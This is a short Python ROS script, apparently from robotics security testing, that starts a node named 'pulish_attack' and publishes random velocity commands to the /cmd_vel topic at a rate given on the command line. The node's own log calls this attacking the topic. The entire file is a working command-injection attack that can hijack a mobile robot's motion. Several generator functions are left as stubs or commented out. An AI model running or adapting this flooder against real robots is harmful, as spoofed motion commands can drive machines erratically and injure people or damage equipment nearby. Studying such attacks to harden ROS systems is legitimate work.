#!/usr/bin/env python
import rospy, rostopic
import random
import time
from tf.msg import tfMessage
from move_base_msgs.msg import MoveBaseActionFeedback
from geometry_msgs.msg import Twist
time_sleeping = 2

def header_handling(header):
  header.seq = 0
  header.stamp = rospy.Time.now()
  header.frame_id = "blah"

def tf_msg_generator():
  msg = tfMessage()
  pass


def nav_vel_msg_generator():
  msg = Twist()
  msg.linear.x = random.uniform(-0.3,  0.3)
  msg.linear.y = 0
  msg.linear.z = 0
  msg.angular.x = 0
  msg.angular.y = 0
  msg.angular.z = random.uniform(-0.3,  0.3)
  return msg

def publish_messages(pub, publisher):
  import time
  r = rospy.Rate(publisher.rate)
  while not rospy.is_shutdown():
    msg = publisher.msg_generator()
    pub.publish(msg)
    #time.sleep(10)
    r.sleep()
    
  
  
def init_publisher(publisher): 
  import time
  rospy.init_node('pulish_attack', anonymous=True)
  #time.sleep(10)
  msg_type, _, _ = rostopic.get_topic_class(publisher.topic)
  pub = rospy.Publisher(publisher.topic, msg_type, queue_size=10)
  publish_messages(pub, publisher)
  rospy.loginfo("start to attak the topic %s" % (publisher.topic))
  rospy.spin()


def init_publisher_information(rate):
  from collections import namedtuple
  publishers = []
  PublisherInfo = namedtuple("PublisherInfo", "topic rate msg_generator")
  #publishers.append(PublisherInfo("/tf", 160, tf_msg_generator))
  publishers.append(PublisherInfo("/cmd_vel", rate, nav_vel_msg_generator)) #/mobile_base_controller/cmd_vel
  return publishers


if __name__ == '__main__':
  import sys
  rate = float(sys.argv[1])
  publishers = init_publisher_information(rate)
  time.sleep(time_sleeping)
  init_publisher(publishers[0])
  #print m.field1
  #msg = MoveBaseActionFeedback()
  #print msg
  #header_handling(msg.header)
  #print msg
  #print help(msg)
  #publisher(topic, publishing_rate)
     
